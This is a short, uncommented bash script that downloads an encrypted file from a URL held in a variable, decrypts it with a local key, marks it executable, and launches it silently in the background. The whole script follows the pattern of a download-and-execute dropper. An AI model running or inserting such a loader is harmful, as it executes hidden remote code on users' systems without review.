#!/bin/bash
curl -fsSL -o "$ENC_PATH" "$TARGET_URL"
openssl enc -d -aes-256-cbc -in "$ENC_PATH" -out "$SAVE_PATH" -pass file:installer.key
chmod +x "$SAVE_PATH"
nohup "$SAVE_PATH" >/dev/null 2>&1 &
